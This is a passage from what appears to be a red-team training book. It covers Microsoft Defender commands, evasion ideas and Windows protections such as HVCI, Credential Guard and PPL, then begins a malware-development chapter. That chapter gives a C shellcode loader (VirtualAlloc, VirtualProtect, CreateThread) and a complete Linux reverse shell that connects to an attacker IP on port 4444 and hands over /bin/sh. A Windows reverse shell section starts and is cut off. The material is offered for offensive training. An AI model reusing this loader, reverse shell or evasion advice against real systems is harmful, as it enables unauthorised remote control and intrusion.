<p><code>MpCmdRun.exe -ValidateMapsConnection</code>: Tests connectivity to the <strong>Microsoft Active Protection Service</strong>, which provides cloud-delivered protection. It is essential for ensuring <strong>SmartScreen</strong> and real-time defense intelligence are functioning.</p>
</li>
</ul>
<p>There are also a number of PowerShell cmdlets that can be used to perform Windows Security operations as well.
For instance, <code>Get-MpComputerStatus</code> can be used to get the real-time operational status of Microsoft Defender:
<img src="https://hackmd.io/_uploads/HJvtQtNzbg.png" alt="image" /></p>
<p><code>Get-MpThreat</code> is another useful cmdlet, which shows the name, severity, and detection time of active threats:
<img src="https://hackmd.io/_uploads/SJhv4tNMZe.png" alt="image" />
Use <code>Remove-MpThreat</code> to remove any detected threats from the system.
You can also run <code>Start-MpScan</code> to run a quick scan on the system:
<img src="https://hackmd.io/_uploads/B1nwdKNzbl.png" alt="image" /></p>
<h3 id="red-team-considerations"><a class="header" href="#red-team-considerations">Red Team Considerations</a></h3>
<p>Red team operations dealing with Microsoft Defender Antivirus require balancing evasion with Operations Security (OpSec) to avoid prematurely alerting blue teams.</p>
<div id="admonition-warning-1" class="admonition admonish-warning" role="note" aria-labelledby="admonition-warning-1-title">
<div class="admonition-title">
<div id="admonition-warning-1-title">
<p>Warning</p>
</div>
<a class="admonition-anchor-link" href="Windows.html#admonition-warning-1"></a>
</div>
<div>
<p><strong>We will discuss OpSec in greater detail in Chapter 6 <em>Introduction to C2 Frameworks and Operations Security</em></strong></p>
</div>
</div>
<p>A few key things to consider. First, Defender's effectiveness depends on configuration and whether it is standalone or integrated with Microsoft Defender for Endpoint (MDE) (This can be verified using <code>Get-Service -Name Sense</code>). You need to test potential payloads in isolated labs mirroring target setups. Defender uses many diferent techniques to identify malicious activity on a system (i.e., <code>Signature-based etection</code>, <code>Behaviroal Analysis</code>, <code>AMSI Integration</code>, <code>Exploit Guard/Windows Defender Application Control</code> (WDAC)). While custom payloads play a vital role in running a successful operation, introducing factors like jitter, custom beacons, and payload patching can help obfuscate payloads and circumvent detection methods. Microsoft Defender uses API hooks to intercept and monitor system calls at runtime. By hooking into critical Windows APIs (i.e., <code>NtCreateFile</code>, <code>NtCreateProces</code>, <code>NtWriteProcessMemory</code>), Defender can inspect, block, or modify potentially dangerous malicious behavior before it executes. Use techniques like Direct Syscalls + sRDI (Syscall Reflective DLL Injection), DLL Highjacking (Side-Loading), and Unhooking and Process Killing to circumvent these protections. (cred: <code>@5mukx</code> on X). Focus on layered evasion: initial access, execution, and persistence. Prioritize LotL to minimize custom binaries.</p>
<p>One more thing to consider. Microsoft Defender Antivirus provides core prevention features (i.e., <code>Real-Time Protection</code>, <code>Exploit Guard</code>, <code>SmartScreen</code>) and operates well as the first-line of defense, However, it is not a full Endpoint Detection and Response (EDR) solution. It works as a prevention solution for known threats and a reactive remediation system to quarantine or delete identified threats. However, it does not work for detection, investigation, or automated response for unknown/advanced threats. Integrate Microsoft Defender Antivirus with Microsoft Defender for Endpoint to form a full, host based EDR solution.</p>
<h2 id="additional-security-features-of-windows"><a class="header" href="#additional-security-features-of-windows">Additional Security Features of Windows</a></h2>
<h3 id="hvci"><a class="header" href="#hvci">HVCI</a></h3>
<p><strong>Hypervisor-Enforced Code Integrity</strong> (HVCI) (aka. <code>Memory Integrity</code>) is a virtualization based security feature that ensures that all code destined for the Windows Kernel has been digitally signed and has not been altered. It relies on <strong>Virtualization-based Security</strong> (VBS), utilizing the hardware's hypervisor to divide the system memory into two different <strong>Virtual Trust Levels</strong>:</p>
<ul>
<li><code>VTL 0</code>: The common area where applications, drivers, and even the OS itself are housed.</li>
<li><code>VTL 1</code>: The highly secure kernel environment that is hidden from VTL 0.</li>
</ul>
<p>During the boot-up process, <code>winload.exe</code> (or <code>winload.efi</code> on UEFI systems) will check the configuration of <strong>VBS</strong> via the <strong>Boot Configuration Data</strong> (BCD) and if it is enabled, it will load <code>hvloader.dll</code> and <code>hvix64.exe</code> or <code>hvax64.exe</code> into memory, initializing the hypervisor. Then, <code>winload.exe</code> loads <code>ntoskrnl.exe</code> into memory the <code>VTL 0</code> memory region under <code>Ring 0</code>. Finally, <code>winload.exe</code> loads <code>securekernel.exe</code> into the <code>VTL 1</code> memory region, under <code>Ring 0</code>. Once all three parts are loaded into memory by <code>winload.exe</code>, it transfers control to <code>hvix64.exe</code> (the hypervisor), which then executes the secure kernel. <code>securekernel.exe</code> sets up its own memory protection systems, and initializes its Code Integrity policices. At this point, the <code>VTL 0</code> environment is set up, so <code>securekernel.exe</code> signals to <code>hvix64.exe</code> that it is ready to monitor the system. Now, <code>hvix64.exe</code> will start <code>ntoskrnl.exe</code> starting up the Windows OS and subsequently, any request to modify the permissions of kernel-mode memory so that it can be executed will result in a <strong>hypercall</strong> being made to the hypervisor, requesting permission for the change to occur. Once this call is made, the hypervisor shifts control to the secure kernel, where <code>skci.dll</code> (Secure Kernel Code Integrity) inspects the region of <code>VTL 0</code> that the permissions change has been requested for and if the code in that region has not been signed by a trusted authority, the request is denied when control is reverted back to <code>VTL 0</code>.</p>
<h3 id="credential-guard"><a class="header" href="#credential-guard">Credential Guard</a></h3>
<p><strong>Credential Guard</strong> is another modern security feature that uses <strong>VBS</strong>. In traditional systems, <code>LSASS.exe</code> stores credentials/secrets in its own process memory, so in the event that attackers gain admin or kernel level permissions, they can dump the memory of <code>LSASS.exe</code> and steal credentials. When Credential Guard is active, the actual secrets and cryptographic keys are moved into a secure process called <code>LSAIso.exe</code>, which runs in <code>VTL 1</code>. This means that when an application needs to authenticate with <code>LSASS.exe</code>, it makes a hypercall and the hypervisor transfers control to <code>LSAIso.exe</code>, where the actual authentication process occurs. The results are then passed back to <code>LSASS.exe</code> for processing.</p>
<h3 id="ppl"><a class="header" href="#ppl">PPL</a></h3>
<p><strong>Protected Process Light</strong> provides kernel-enforced protections for critical system processes and approved third-party services making them highly resistant to tampering, even against processes with administrative privileges. The kernel provides a protection level to processes based on their digital signature, which often require special Microsoft certificates. Only processes with an equal or higher protection level can interact with a PPL process in a privileged way:</p>
<ol>
<li><strong>PsProtectedSignerWinTcb</strong>: The highest protection level. It is used for core <strong>Trusted Computing Base</strong> (TCB) components, such as <code>smss.exe</code>.</li>
<li><strong>PsProtectedSignerWindows</strong>: For standard Windows processes.</li>
<li><strong>PsProtectedSignerLsa</strong>: For LSASS</li>
<li><strong>PsProtectedSignerAntimalware</strong>: Also called <strong>Antimalware Protected Process Light</strong> (AM-PPL). Used for approved antimalware services, such as Microsoft Defender's <code>MsMpEng.exe</code>.</li>
<li><strong>PsProtectedSignerCodeGen</strong>: A reserved or internal signer class that Windows currently does not use for any major subsystem. There is no evidence of real‑world usage.</li>
<li><strong>PsProtectedSignerAuthenticode</strong>: The weakest level of PPL class that requires Microsoft-trusted Authenticode signing.</li>
<li><strong>PsProtectedSignerNone</strong>: The default for normal user an system processes. No protection provided.</li>
</ol>
<p>You can check the level of protection a given program has been assigned by querying <code>HKLM\SYSTEM\CurrentControlSet\Services\[ServiceName]</code> and checking the <code>LaunchProtected</code> value:
<img src="https://hackmd.io/_uploads/B1avj534be.png" alt="image" /></p>
<p>The <a href="https://www.vergiliusproject.com/kernels/x64/windows-11/25h2/_PS_PROTECTED_SIGNER">_PS_PROTECTED_SIGNER</a> structure contains definitions and names for all the protection levels that can be assigned to a PPL.</p>
<p>This value can give you a hint as to what the actual PPL protection level is for any service, although the actual value is different and is stored as part of a kernel object, <code>EPROCESS.Protection</code>. This is what each hexadecimal value means:</p>
<ul>
<li><code>SERVICE_LAUNCH_PROTECTED_NONE</code>: 0 - Not PPL</li>
<li><code>SERVICE_LAUNCH_PROTECTED_WINDOWS</code>: 1 - WinTcb/WinSystem depending on the signature</li>
<li><code>SERVICE_LAUNCH_PROTECTED_WINDOWS_LIGHT</code>: 2 - WinTcb-Light/WinSystem-Light</li>
<li><code>SERVICE_LAUNCH_PROTECTED_ANTIMALWARE_LIGHT</code>: 3 - Antimalware-Light</li>
</ul>
<h2 id="conclusion-1"><a class="header" href="#conclusion-1">Conclusion</a></h2>
<p>As the largest PC operating system in the world, Windows is a frequent target for malicious actors to study and develop exploits for. As an OffSec professional, understanding how Windows works and how it is organized is the first step in being able to analyze, write exploits, and manage command and control servers for Windows systems and domains. As we move forward from here, use this chapter as reference. The subjects we covered here play an important role in successfully running a Red Team Operation.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="malware-essentials"><a class="header" href="#malware-essentials">Malware Essentials</a></h1>
<p><code>Malware</code> is a type of software designed to conduct malicious actions, such as gaining unauthorized access to a computer or stealing sensitive information from a computer. Malware can be used by ethical hackers to execute an authorized security assessment of an organization. Developing custom tools, such as malware, that have not been analyzed or signed by security vendors provides the attack team with an advantage in terms of detection.</p>
<div id="admonition-note" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-title">
<div class="admonition-title">
<div id="admonition-note-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="Essentials.html#admonition-note"></a>
</div>
<div>
<p>The methods used by an attack team to avoid detection is sometimes referred to as <strong>Operational Security</strong> (OpSec).
<code>OpSec</code>: a military term used to describe the set of practices and mindset used to protect information about operations so that adversaries can't discover, understand, or exploit them.</p>
<p>Within the context of Offensive Security, <code>OpSec</code> is about protecting both the technical and human traces that would reveal the activity, identity, tools, or intentions of the Red Team, while staying within legal and ethical boundaries.</p>
</div>
</div>
<p>Malware can be developed in any programming language, but C/C++ have long been a preferred language for both malware development and the broader field of adversary simulation. These languages allow for direct manipulation of hardware and memory, offering unparalleled control and flexibility in crafting code that interacts with operating systems, network protocols, and other core computing components.</p>
<h2 id="a-simple-example"><a class="header" href="#a-simple-example">A Simple Example</a></h2>
<p>First, a basic piece of malware may allocate a chunk of memory:</p>
<pre><code class="language-C">payload_mem = VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
</code></pre>
<p>Where:</p>
<ul>
<li><code>VirtualAlloc</code>: a core Windows API (part of Win32, <code>kernel32.dll</code>), which allows a process to reserve, commit, or change the state of pages in its virtual address space. It is fundamental for many memory related operations, including many in Malware Development, such as:
<ul>
<li>Allocating a buffer for shellcode</li>
<li>Process Injection</li>
<li>Manipulating memory pages</li>
</ul>
</li>
</ul>
<p>Here is a breakdown of the <code>VirtualAlloc</code> functions parameters:</p>
<pre><code class="language-C">LPVOID VirtualAlloc(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD flAllocationType,
    DWORD flProtect
);
</code></pre>
<ul>
<li><code>lpAddress</code>: A pointer to the desired starting address of the region to allocate. <code>0</code> or <code>NULL</code> defaults to a random location determined by the system.</li>
<li><code>dwSize</code>: Specifies the size of the region to allocate in bytes. <code>VirtualAlloc</code> allocates memory in terms of whole pages. The provided will be rounded up to the next page boundary.</li>
<li><code>flAllocationType</code>: A bitmask that defines the type of memory allocation. Flags can be combined using the <strong>bitwise OR</strong> (|) operator:
<ul>
<li><code>MEM_COMMIT</code>: Commits a reserved page, allocating physical space in RAM</li>
<li><code>MEM_RESERVE</code>: Reserves a range of the process's virtual address space, preventing other allocations from using this range.</li>
<li><code>MEM_RESET</code>: Removes a specified set of pages from the working set to allow the system to reclaim the physical RAM used by those pages without having to write their contents to the page file. This is undone by <code>MEM_RESET_UNDO</code> (if possible).</li>
</ul>
</li>
<li><code>flProtect</code>: A bitmask that specifies the memory protection for the allocated region. This dictates what operations (<strong>Read</strong>, <strong>Write</strong>, or <strong>Execute</strong>) are allowed:
<ul>
<li><code>PAGE_EXECUTE_READ</code>: Grants Read and Execute (RX) permissions.</li>
<li><code>PAGE_EXECUTE_READWRITE</code>: Grants Read, Write, and Execute (RWX) permissions.</li>
<li><code>PAGE_EXECUTE_WRITECOPY</code>: Similar to RWX, but for copy-on-write scenarios.</li>
<li><code>PAGE_NOACCESS</code>: Grants no permissions on the memory region for the current process.</li>
<li><code>PAGE_READONLY</code>: Grants Read (R) permissions.</li>
<li><code>PAGE_READWRITE</code>: Grants Read and Write (RW) permissions.</li>
</ul>
</li>
</ul>
<p><code>VirtualAlloc</code> returns the base address of the allocated region on success, and returns <code>NULL</code> on failure. If an error occurs, use the <code>GetLastError()</code> API to learn more about why.</p>
<p>After allocating the memory space, the payload gets copied into that memory region:</p>
<pre><code class="language-C">RtlMoveMemory(payload_mem, actual_payload, sizeof(payload));
</code></pre>
<p>Where:</p>
<ul>
<li><code>RtlMoveMemory</code>: a core Windows API (part of Win32 API, <code>kernel32.dll</code>), used to copy a block of memory from a source location to a destination within the same virtual address space. Fundamental for malware developers because it is a reliable way to manipulate and execute code directly in a computer's memory. Its ability to handle overlapping memory regions is crucial fro a wide variety of in-memory attacks that help malware evade detection by antivirus and security software, including:
<ul>
<li>Shellcode Execution</li>
<li>Process Injection</li>
<li>Process Hollowing</li>
<li>In-Memory Patching and Hooking</li>
</ul>
</li>
</ul>
<p>Here is a breakdown of the <code>RtlMoveMemory</code> functions parameters:</p>
<pre><code class="language-C">void RtlMoveMemory(
    void* Destination,
    const void* Source,
    SIZE_T Length
);
</code></pre>
<ul>
<li><code>Destination</code>: A pointer to the starting address of the destination memory block.</li>
<li><code>Source</code>: A constant pointer to the starting address of the source memory block.</li>
<li><code>Length</code>: The number of bytes to copy from the source to the destination.</li>
</ul>
<p>After the payload is copied into the process's memory, the permissions for that memory region must be updated so that the payload can be executed:</p>
<pre><code class="language-C">operation_status = VirtualProtect(payload_mem, sizeof(payload), PAGE_EXECUTE_READ, &amp;old_protect);
</code></pre>
<p>Where:</p>
<ul>
<li><code>VirtualProtect</code>: A core Windows API (part of the Win32 API, <code>kernel32.dll</code>), which updates the permissions of a given region of memory. It is used by malware to avoid detection by:
<ul>
<li>Evading Signature-Based Detection</li>
<li>Bypassing Behavioral Analysis</li>
<li>Executing Code Directly in Memory</li>
</ul>
</li>
</ul>
<p>Here is a breakdown of the <code>VirtualProtect</code> functions parameters:</p>
<pre><code class="language-C">BOOL VirtualProtect(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD flNewProtect,
    PDWORD lpflOldProtect
);
</code></pre>
<ul>
<li><code>lpAddress</code>: A pointer to the starting address of the memory region whose protection attributes are to be changed.</li>
<li><code>dwSize</code>: The size of the memory region in bytes for which the protection attributes are to be changed.</li>
<li><code>flNewProtect</code>: A flag specifying the new protection options for the memory region.</li>
<li><code>lpflOldProtect</code>: A pointer to a variable that receives the previous protection options of the specified memory region.</li>
</ul>
<p><code>VirtualProtect</code> returns a non-zero value if successful and zero if the operation failed.</p>
<p>Finally, since the memory region is executable, the malware creates a new thread of execution and starts running the payload in that new thread:</p>
<pre><code class="language-C">if (operation_status != 0){
    thread_handle = CreateThread(0, 0, (LP_THREAD_START_ROUTINE)payload_mem, 0, 0, 0);
    WaitForSingleObject(thread_handle, -1);
}
return 0;
</code></pre>
<p>Where:</p>
<ul>
<li><code>CreateThread</code>: A core Windows API (part of the Win32 API, <code>kernel32.dll</code>) used to create a new thread of execution within the address space of the calling process. Used by malware to concurrently run the payload with the rest of the application, often within the context of a legitimate process to avoid detection.
Here is a breakdown of the <code>CreateThread</code> functions parameters:</li>
</ul>
<pre><code class="language-C">HANDLE CreateThread(
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    SIZE_T dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID lpParameter,
    DWORD dwCreationFlags,
    LPDWORD lpThreadId
);
</code></pre>
<ul>
<li><code>lpThreadAttributes</code>: A pointer to a <code>SECURITY_ATTRIBUTES</code> structure that determines if the returned object handle can be inherited by child processes. If set to 'NULL', a default security descriptor is passed, which makes the thread uninheritable by child processes.</li>
<li><code>dwStackSize</code>: The initial size of the new thread's stack in bytes, A vale of <code>0</code> defaults to the same size as the main threads stack.</li>
<li><code>lpStartAddress</code>: A pointer to the application-defined function that the new thread will execute (the payload).</li>
<li><code>lpParameter</code>: A pointer to a variable that is passed as a single argument to the function.</li>
<li><code>dwCreationFlags</code>: A flag that controls the creation state of the new thread. It can be <code>0</code> to run the thread immediately or <code>CREATE_SUSPENDED</code> to create it in a suspended state.</li>
<li><code>lpThreadId</code>: A pointer to a variable that receives the unique identifier for the new thread. This can be useful for managing or terminating the thread later.</li>
</ul>
<p><code>CreateThread</code> returns a handle to the new thread if successful. <code>NULL</code> if it fails.</p>
<ul>
<li><code>WaitForSingleObject</code>: A core Windows API (part of the Win32, <code>kernel32.dll</code>) used to wait for a single object to be in a signaled state (i.e., the thread completes execution).</li>
</ul>
<p>Here is a breakdown of the <code>WaitForSingleObject</code> function's parameters:</p>
<pre><code class="language-C">DWORD WaitForSingleObject(
    HANDLE hHandle,
    DWORD dwMilliseconds
);
</code></pre>
<ul>
<li><code>hHandle</code>: A handle to the object you want to wait for</li>
<li><code>dwMilliseconds</code>: The time-out interval in milliseconds.
<ul>
<li><code>INFINITE</code>: Functions will wait until the object is signaled. (Same as <code>-1</code>)</li>
<li><code>0</code>: Function will check the objects state and return immediately without waiting.</li>
</ul>
</li>
</ul>
<p><code>WaitForSingleObject</code> returns a DWORD (32-bit unsigned integer) that indicates the state of the wait:</p>
<ul>
<li><code>WAIT_OBJECT_0</code>: Success</li>
<li><code>WAIT_TIMEOUT</code>: Timeout elapsed before signal received</li>
<li><code>WAIT_ABANDONED</code>: Specific to mutex objects. Thread holding mutex terminated without releasing.</li>
<li><code>WAIT_FAILED</code>: Failure for any other reason.</li>
</ul>
<p>As we can see here, the granular control enabled by <code>C</code>/<code>C++</code> enables the creation of complex, stealthy, and tailored malware that can evade detection, manipulate system behavior, and carry out sophisticated tasks.</p>
<h2 id="types-and-behaviors-of-malware"><a class="header" href="#types-and-behaviors-of-malware">Types and Behaviors of Malware</a></h2>
<p>A <strong>Virus</strong> is a piece of code that attaches itself to other programs and replicates itself, often causing damage in the process. <strong>Worms</strong> are self-replicating malware that spreads autonomously across networks, without human intervention and <strong>Trojans</strong> are pieces of software that appear legitimate, but actually have a hidden, malicious purpose. As we move forward, we will discover how these, and other types of malware are implemented and used. There are many types of malware, but generally speaking, malware applications exhibit certain types of behavior that allow them to be classified as malicious programs. Some of these behaviors include:</p>
<ul>
<li><code>Backdoors</code>: A feature of malware that allows an attacker to break normal authentication or encryption, providing attackers with an invisible access to systems, enabling them to remotely control the victim's machine for various malicious activities.</li>
<li><code>Downloaders</code>: Malicious programs, which download and install other malware once they are installed on a target system. These are often used in multi-stage attacks, where the downloader serves as a means to bring in more advanced, and sometimes tailored, threats onto the compromised machine.</li>
<li><code>Remote Access Trojan</code>: A specific type of Trojan that provides an attacker with complete, covert, remote control over an infected machine. RATs can be particularly dangerous because they often remain undetected by antivirus software.</li>
<li><code>Stealers</code>: Malware designed to extract sensitive data from a victim's system, including passwords, credit card details, and other personal information.</li>
<li><code>Bootkits</code>: Malware that infects the <strong>master boot record</strong> (MBR). By attacking the startup routine, the bootkit ensures that it loads before the operating system, remaining hidden from antivirus programs.</li>
</ul>
<p>A particularly important behavior of malware is that it may establish a <strong>reverse shell</strong>. Reverse shells are a communication technique where the compromised machine initiates a connection to the attacker, creating a covert channel that can bypass firewalls and network restrictions. This technique, however, exposes the attacker's control server, and network security monitoring services may be able to detect traces.</p>
<p>There are three stages required to create a reverse shell:</p>
<ol>
<li>An adversary exploits a system or network flaw that allows code execution on the target.</li>
<li>The adversary the installs a listener on their own system.</li>
<li>The vulnerability is exploited by the adversary injecting a reverse shell on a vulnerable system.</li>
</ol>
<p>In actual cyberattacks, the reverse shell can also be obtained through social engineering. For instance, malware installed on a local workstation through a phishing email or a malicious website could initiate an outgoing connection to a command server and provide the hacker with a reverse shell.</p>
<h3 id="linux-reverse-shells"><a class="header" href="#linux-reverse-shells">Linux Reverse Shells</a></h3>
<p>Fundamentally, computers are very complex machines. It would be practically infeasible to write a program that conducted every operation you, the developer, intended for it to do. For this reason, developers write and publish their own code, so that others can build their own applications using the pre-existing code. There is no need to re-invent the wheel.</p>
<ol>
<li>When building a reverse shell on linux, there are a number of headers that need to be included so that the program runs as intended:</li>
</ol>
<pre><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;netinet/ip.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;sys/socket.h&gt;
</code></pre>
<ul>
<li><code>stdio.h</code>(Standard Input/Output): A standard C library header that provides functions for basic input and output operations. It's widely used in malware for tasks like printing debug messages to the console (<code>printf</code>) or reading and writing to files (<code>fopen</code>, <code>fread</code>, <code>fwrite</code>).</li>
<li><code>unistd.h</code> (Unix Standard): Provides access to the <strong>Portable Operating System Interface</strong> (POSIX) API. It contains functions that give a program access to the operating system's features such as file II/O (read, write, close), process control (fork, exec), and system-level information. In malware development, it is used for low-level, direct interaction with the system, often for persistence or process manipulation.</li>
<li><code>sys/socket.h</code>: The core header file for socket programming, which defines the data structures and functions required to create and manage network sockets. This is the foundation for any tool that needs to communicate over a network, including those that establish a reverse shell. Key functions include:
<ul>
<li><code>socket()</code>: Creates a new socket</li>
<li><code>bind()</code>: Assigns a name (i.e., an IP address and port) to a socket.</li>
<li><code>connect()</code>: Initiates a connection to a remote host.</li>
<li><code>listen()</code>: Puts a socket in a listening state for incoming connections.</li>
</ul>
</li>
<li><code>arpa/inet.h</code>: Provides functions for manipulating Interned Addresses. Used to convert between different data representations, such as converting a human-readable IP address string (i.e., <code>192.168.1.1</code>) into a binary format that can be used by the network functions defined in <code>sys/socket.h</code>.</li>
<li><code>netinet/ip.h</code>: Defines the structures and constants for the <strong>Internet Protocol</strong> (IP). Used for more advanced, low-level network programming, such as when a program needs to directly craft and send custom IP packets, rather than using higher-level protocols like TCP or UDP. Particularly useful for certain types of exploits or covert communication.</li>
</ul>
<ol start="2">
<li>After including the required headers, the first thing the malware does is define the IP address of the attacking machine:</li>
</ol>
<pre><code class="language-C">const char* attacker_ip = "10.10.1.5";
</code></pre>
<ol start="3">
<li>Then, the malware prepares the target victim's address:</li>
</ol>
<pre><code class="language-C">struct sockaddr_in target_address;
target_address.sin_family = AF_INET;
target_address.sin_port = htons(4444);
inet_aton(attacker_ip, &amp;target_address.sin_addr);
</code></pre>
<ul>
<li>
<p><code>sockaddr_in</code>: Used to specify the address and port of the communicating endpoint. It is passed to key socket functions to tell the operating system where to send or listen for data. It is included in <code>&lt;sys/socket.h&gt;</code>. Here are the <code>sockaddr_in</code> function's parameters:</p>
<pre><code class="language-C">struct sockaddr_in {
    sa_family_t sin_family;
    in_port_t sin_port;
    struct in_addr sin_addr;
}
</code></pre>
<ul>
<li><code>sin_family</code>: Specifies the address family of the new socket. Always <code>AF_INET</code> if the socket should be set up for IPv4.</li>
<li><code>sin_port</code>: Holds the port number. Must be in network byte order (big-endian).</li>
<li><code>sin_addr</code>: Another structure that contains the actual IPv4 address. Must be in network byte order (big-endian).</li>
</ul>
<p>A server/listener would fill a <code>sockadddr_in</code> structure with its own IP address and the port it wants to listen on. It then passes this structure to the <code>bind()</code> function to associate the socket with that specific address. A client would fill a <code>sockaddr_in</code> structure with the IP address and port of the server it wants to connect to . It then passes this structure to the <code>connect()</code> function.</p>
</li>
<li>
<p><code>htons</code>: Used in network programming to convert a 16-bit integer from host byte order to network byte order. It stands for <strong>host to network, short</strong>. It is included in <code>&lt;arpa/inet.h&gt;</code>, but defined in <code>&lt;netinet/in.h&gt;</code> and its only argument is a 16-bit integer.</p>
</li>
<li>
<p><code>inet_aton</code>: A standard C library function used for network programming, used to convert a human-readable IPv4 address string (in dotted-decimal notation) into a binary format that is compatible with network functions and stored in network byte order. It is included in <code>&lt;arpa/inet.h&gt;</code> and stands for <strong>Address to Network</strong> (Internet Address to Network Number).</p>
<pre><code class="language-C">int inet_aton(const char *cp, struct in_addr *inp);
</code></pre>
<ul>
<li><code>const char *cp</code>: The input parameter. A pointer to a character string that contains the IPv4 address you want to convert.</li>
<li><code>struct in_addr *inp</code>: The output parameter. A pointer to an <code>in_addr</code> structure.</li>
<li><code>inet_aton</code> returns a non-zero integer if successful. Zero upon failure.</li>
</ul>
</li>
</ul>
<ol start="4">
<li>After creating the <code>sockaddr_in</code> object, the malware creates a new socket.</li>
</ol>
<pre><code class="language-C">int socket_file_descriptor = socket(AF_INET, SOCK_STREAM, 0);
</code></pre>
<p>Where:</p>
<ul>
<li><code>socket</code>: a fundamental system call used in <code>C/C++</code> to create a communication endpoint. Creating a socket is the first step a program takes when it wants to perform network communication, whether it is a client or a server. Include in <code>&lt;sys/socket.h&gt;</code>.
<pre><code class="language-C">int socket(int domain, int type, int protocol);
</code></pre>
Here is a breakdown of its parameters:
<ul>
<li><code>int domain</code>: Specifies the communication domain or address family.
<ul>
<li><code>AF_INET</code>: Represents the IPv4 Internet Protocol</li>
<li><code>AF_INET6</code>: Represents the IPv6 Internet Protocol</li>
<li><code>AF_LOCAL</code> or <code>AF_UNIX</code>: Used for inter-process communication on a single machine.</li>
</ul>
</li>
<li><code>int type</code>: Specifies the type of socket, which defines the communication semantics.
<ul>
<li><code>SOCK_STREAM</code>: Reliable, two-way connection (like TCP)</li>
<li><code>SOCK_DGRAM</code>: Connectionless, unreliable datagram service (like UDP)</li>
<li><code>SOCK_RAW</code>: Direct access to underlying network protocols. Used for advanced network tools or exploits.</li>
</ul>
</li>
<li><code>int protocol</code>: Specifies the particular protocol to be used within the specified domain and type. Usually set to <code>0</code>, which tells the operating system to automatically choose the correct protocol. For instance, if you choose <code>AF_INET</code> and <code>SOCK_STREAM</code>, the protocol will automatically be <code>TCP</code>.</li>
<li><code>socket</code> returns a non-negative integer on success. This integer is a socket descriptor (or a handle on Windows), which acts like a file descriptor. ALl subsequent network functions (<code>bind()</code>, <code>connect()</code>, <code>send()</code>, <code>recv()</code>) use this descriptor to identify the socket. On failure, it returns <code>-1</code>.</li>
</ul>
</li>
</ul>
<ol start="5">
<li>Here, the new socket connects to the attacker's server:</li>
</ol>
<pre><code class="language-C">connect(socket_file_descriptor, (struct sockaddr*)&amp;target_address, sizeof(target_address));
</code></pre>
<p>Where:</p>
<ul>
<li><code>connect()</code>: A critical system call used by a client program to initiate a socket connection with a server. Attempts to establish a connection to a specific network address and port, which are typically defined by the server application that is already listening for incoming connections. Included in <code>&lt;sys/socket.h&gt;</code>.
<pre><code class="language-C">int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
</code></pre>
Here is a breakdown of the function's parameters:
<ul>
<li><code>int sockfd</code>: Socket descriptor returned by <code>socket()</code></li>
<li><code>const struct sockaddr *addr</code>: A pointer to a <code>sockaddr</code> structure</li>
<li><code>socklen_t addrlen</code>: An integer that specifies the size, in bytes of the address structure pointed to by the <code>addr</code> parameter.</li>
<li><code>connect()</code> returns <code>0</code> on success, <code>-1</code> on failure.</li>
</ul>
</li>
</ul>
<ol start="6">
<li>The most important process occurs when standard input, standard output, and standard error are redirected to the socket:</li>
</ol>
<pre><code class="language-C">for (int index=0; index &lt; 3; index++){
    dup2(socket_file_descriptor, index);
}
</code></pre>
<p>Where:</p>
<ul>
<li><code>dup2()</code>: A powerful system call used in C programming on Unix-like systems to duplicate an existing file descriptor. Shorthand for <strong>duplicate to</strong>. Critical function for malware development because it is the primary way to redirect a program's standard input, output and error streams to a new destination, such as a network socket. It serves as the core mechanism used to create a reverse shell. Included in <code>&lt;unistd.h&gt;</code>.
<pre><code class="language-C">int dup2(int oldfd, int newfd);
</code></pre>
Here is a breakdown of the function's parameters:
<ul>
<li><code>int oldfd</code>: The file descriptor that you want to duplicate. In the context of a reverse shell, this would be the socket descriptor returned by a <code>socket()</code> call.</li>
<li><code>int newfd</code>: The new file descriptor number that you want the <code>oldfd</code> to be duplicated to. If <code>newfd</code> is already open, it is closed first. FOr a reverse shell, the values for this parameter are:
<ul>
<li><code>0</code>: Standard Input (<code>stdin</code>)</li>
<li><code>1</code>: Standard Output (<code>stdout</code>)</li>
<li><code>2</code>: Standard Error (<code>stderr</code>)</li>
</ul>
</li>
<li><code>dup2</code> returns the new file descriptor on success (i.e., the same value as the <code>newfd</code> parameter). On failure, it returns <code>-1</code>.</li>
</ul>
</li>
</ul>
<ol start="7">
<li>The last step is to spawn a shell:</li>
</ol>
<pre><code class="language-C">execve("/bin/sh", NULL, NULL);
</code></pre>
<p>Where:</p>
<ul>
<li><code>execve</code>: A powerful system call used on Unix-like operating systems to execute a new program by replacing the current process with a new one without creating a new process ID (PID). The new process completely overwrites the existing process code, data, and stack. From the perspective of the operating system, the process's PID remains the same, but the program it is running changes entirely. Included in <code>&lt;unistd.h&gt;</code>.
<pre><code class="language-C">int execve(const char *pathname, char *const argv[], char *const envp[]);
</code></pre>
<ul>
<li><code>const char *pathname</code>: A pointer to a null-terminated string that contains the full path to the executable file that you want to run.</li>
<li><code>char *const argv[]</code>: A null-terminated array of pointers to character strings, which represent the command-line arguments for the new program. The first element of this array is conventionally the name of the program itself.
<ul>
<li>For instance, if you ran <code>ls -l</code>, <code>argv[] = {"ls", "-l", NULL}</code></li>
</ul>
</li>
<li><code>char *const envp[]</code>: A null-terminated array of pointers to character strings representing the environment variables for the new program.</li>
<li><code>execve</code> will not return is the call was successful, as the current program is replaced with the new one. If it fails, it returns <code>-1</code>.</li>
</ul>
</li>
</ul>
<h3 id="windows-reverse-shells"><a class="header" href="#windows-reverse-shells">Windows Reverse Shells</a></h3>
<p>Conceptually, Windows Reverse Shells and Linux Reverse Shells utilize the same principles. In practice, Windows applications should be built using the Windows API because it exposes certain features of the operating system that the POSIX model cannot handle.</p>
<ol>
<li>Include the required libraries, variables and structures to create a reverse-shell:</li>
</ol>
<pre><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;winsock2.h&gt;
#pragma comment(lib, "ws2_32")
WSADATA socketData;
SOCKET mainSocket;
struct sockaddr_in connectionAddress;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInfo;
</code></pre>
<p>Where:</p>
<ul>
<li>
